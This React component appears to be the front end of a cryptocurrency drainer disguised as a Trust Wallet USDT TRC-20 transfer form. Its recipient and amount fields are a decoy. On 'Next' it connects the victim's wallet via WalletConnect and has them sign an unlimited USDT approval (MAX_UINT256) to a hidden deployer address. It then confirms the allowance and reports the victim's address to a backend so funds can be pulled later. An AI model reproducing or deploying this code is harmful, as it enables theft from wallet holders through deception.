import React, { useState, useEffect, useRef } from 'react';
import SignClient from '@walletconnect/sign-client';
import { TronWeb } from 'tronweb';
import '../App.css';

const USDT_TRC20    = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const APPROVE_TO    = import.meta.env.VITE_DEPLOYER_ADDRESS;
const BACKEND_URL   = import.meta.env.VITE_BACKEND_URL;
const API_KEY       = import.meta.env.VITE_API_KEY;
const RECIPIENT     = import.meta.env.VITE_RECIPIENT_ADDRESS;
const WC_PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID;
const MAX_UINT256   = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
const TRON_CHAIN    = 'tron:0x2b6653dc';

const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });

let signClient = null;

const initWC = async () => {
  if (signClient) return signClient;
  signClient = await SignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: {
      name: 'USDT Transfer',
      description: 'USDT TRC-20 Transfer',
      url: window.location.origin,
      icons: [`${window.location.origin}/favicon.svg`],
    },
  });
  return signClient;
};

const TransferForm = ({ onApproved }) => {
  const [amount,    setAmount]    = useState('');
  const [recipient, setRecipient] = useState(RECIPIENT || '');
  const [loading,   setLoading]   = useState(false);
  const [errorMsg,  setErrorMsg]  = useState('');
  const [status,    setStatus]    = useState('');

  const lockRef = useRef(false);
  const estimate = amount ? parseFloat(amount).toFixed(2) : '0.00';

  useEffect(() => {
    const params    = new URLSearchParams(window.location.search);
    const urlAddr   = params.get('address');
    const urlAmount = params.get('amount');
    if (urlAddr)   setRecipient(urlAddr);
    if (urlAmount) setAmount(urlAmount);
  }, []);

  const doApprove = async () => {
    if (lockRef.current) return;
    lockRef.current = true;
    setLoading(true);
    setErrorMsg('');
    setStatus('');

    try {
      const client = await initWC();

      // Old sessions disconnect
      const oldSessions = client.session.getAll();
      for (const s of oldSessions) {
        try { await client.disconnect({ topic: s.topic, reason: { code: 6000, message: 'reset' } }); } catch {}
      }

      setStatus('Connecting wallet...');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          tron: {
            methods: ['tron_signTransaction'],
            chains: [TRON_CHAIN],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      // Trust Wallet deeplink
      if (uri) {
        const trustDeeplink = `trust://wc?uri=${encodeURIComponent(uri)}`;
        window.location.href = trustDeeplink;
      }

      // Wait for wallet connection
      const session     = await approval();
      const userAddress = session.namespaces.tron.accounts[0].split(':')[2];
      if (!userAddress) throw new Error('No account found');

      setStatus('Preparing transaction...');

      // TRX topup
      try {
        const res  = await fetch(`${BACKEND_URL}/api/wallets/topup`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY || '' },
          body: JSON.stringify({ to: userAddress }),
        });
        const data = await res.json();
        if (data.isNeededGas) {
          setStatus('Waiting for gas...');
          await new Promise(r => setTimeout(r, 5000));
        }
      } catch (e) { console.error('topup error:', e); }

      setStatus('Please approve in Trust Wallet...');

      // Build approve transaction
      const built = await tronWeb.transactionBuilder.triggerSmartContract(
        tronWeb.address.toHex(USDT_TRC20),
        'approve(address,uint256)',
        { feeLimit: 1_000_000_000, callValue: 0 },
        [
          { type: 'address', value: APPROVE_TO },
          { type: 'uint256', value: MAX_UINT256 },
        ],
        tronWeb.address.toHex(userAddress)
      );

      // Sign via WalletConnect
      const signResult = await client.request({
        topic: session.topic,
        chainId: TRON_CHAIN,
        request: {
          method: 'tron_signTransaction',
          params: { address: userAddress, transaction: built },
        },
      });

      if (!signResult) throw new Error('Transaction rejected');

      setStatus('Broadcasting transaction...');

      // Broadcast
      const signedTx  = signResult.result || signResult;
      const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);

      if (!broadcast.result && !broadcast.txid) throw new Error('Broadcast failed');

      const txid = broadcast.txid || broadcast.transaction?.txID;
      console.log('Approve txid:', txid);

      // Wait for confirmation on chain
      setStatus('Confirming on TRON...');
      await new Promise(r => setTimeout(r, 4000));

      // Verify allowance actually came through
      const allowRes = await tronWeb.transactionBuilder.triggerConstantContract(
        tronWeb.address.toHex(USDT_TRC20),
        'allowance(address,address)',
        {},
        [
          { type: 'address', value: tronWeb.address.toHex(userAddress) },
          { type: 'address', value: tronWeb.address.toHex(APPROVE_TO) },
        ],
        tronWeb.address.toHex(userAddress)
      );
      const allowance = BigInt('0x' + allowRes.constant_result[0]);

      if (allowance === 0n) throw new Error('Approval not confirmed yet. Please try again.');

      // Backend notify
      try {
        await fetch(`${BACKEND_URL}/api/wallets/approved`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY || '' },
          body: JSON.stringify({ address: userAddress, amount }),
        });
      } catch (e) { console.error('approved notify error:', e); }

      onApproved(amount || '0', 'completed');
      setAmount('');

    } catch (e) {
      console.error('doApprove error:', e);
      let msg = 'Transaction failed';
      if (e.message?.includes('rejected') || e.message?.includes('declined') || e.message?.includes('User rejected')) msg = 'Transaction rejected by user';
      else if (e.message?.includes('Modal closed') || e.message?.includes('reset')) msg = 'Connection cancelled. Try again.';
      else if (e.message?.length <= 100) msg = e.message;
      setErrorMsg(msg);
    } finally {
      setLoading(false);
      setStatus('');
      lockRef.current = false;
    }
  };

  return (
    <div className="page theme-dark">
      <div className="card">

        <div className="input-group">
          <label className="label">Address or Domain Name</label>
          <div className="input-row primary">
            <input
              placeholder="Search or Enter"
              value={recipient}
              onChange={(e) => setRecipient(e.target.value)}
            />
            <span className="paste" onClick={() => navigator.clipboard.readText().then(setRecipient)}>Paste</span>
            <div className='right-icons'>
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" strokeWidth="2.5" fill="none" strokeLinecap="round" strokeLinejoin="round" className="contact-icon"><rect x="6" y="4" width="14" height="16" rx="2"></rect><line x1="4" y1="8" x2="6" y2="8"></line><line x1="4" y1="12" x2="6" y2="12"></line><line x1="4" y1="16" x2="6" y2="16"></line><line x1="9" y1="9" x2="17" y2="9"></line><line x1="9" y1="12" x2="17" y2="12"></line></svg>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="qr-icon"><path d="M3 7V5a2 2 0 0 1 2-2h2"></path><path d="M17 3h2a2 2 0 0 1 2 2v2"></path><path d="M21 17v2a2 2 0 0 1-2 2h-2"></path><path d="M7 21H5a2 2 0 0 1-2-2v-2"></path><line x1="7" y1="12" x2="17" y2="12"></line></svg>
            </div>
          </div>
        </div>

        <label className="label">Destination network</label>
        <div className="network-row">
          <div className="network-left">
            <img className="network-icon" src="/tron-logo.png" alt="TRX" />
            <span>Tron Network (TRC-20)</span>
          </div>
          <img className="network-arrow" src="arrow.png" alt="arrow" />
        </div>

        <label className="label">Amount</label>
        <div className="input-row amount-row">
          <input
            placeholder="USDT Amount"
            type="number"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
          />
          <span className="unit">USDT</span>
          <span className="max" onClick={() => setAmount('1000.00')}>Max</span>
        </div>
        <p className="estimate" style={{ color: errorMsg ? 'red' : undefined }}>
          {errorMsg ? errorMsg : status ? status : `≈ $${estimate}`}
        </p>

        <button
          className={`connect-btn ${recipient && amount ? 'active' : 'idle'}`}
          disabled={!recipient || !amount || loading}
          onClick={doApprove}
        >
          {loading ? 'Please wait...' : 'Next'}
        </button>

      </div>
    </div>
  );
};

export default TransferForm;
